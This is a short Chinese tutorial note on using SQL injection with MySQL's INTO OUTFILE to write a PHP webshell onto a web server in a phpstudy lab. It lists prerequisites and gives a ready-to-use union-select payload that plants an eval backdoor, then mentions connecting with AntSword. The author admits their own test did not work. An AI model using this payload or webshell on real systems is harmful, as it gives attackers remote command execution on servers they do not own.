# 利用SQL注入漏洞上传木马

## 一、原理

一般使用into outfile将select的结果写入指定目录中

### 前提

需要知道远程目录

需要有远程目录写的权限

需要数据库开启secure_file_priv服务

## 二、实践

### 开启secure_file_priv服务

在phpstudy搭建的环境中，需要在mysql的配置文件my.ini中添加secure_file_priv=

然后创建一个可执行的php文件

#### 写入

```
kobe' union select "<?php @eval($_GET['cmd'])?>",2 into outfile "var/www/html/index01.php"#
```

定点访问即可

写入成功后就可以用蚁剑进行连接，或者在url进行操作

这个我测试一直不行
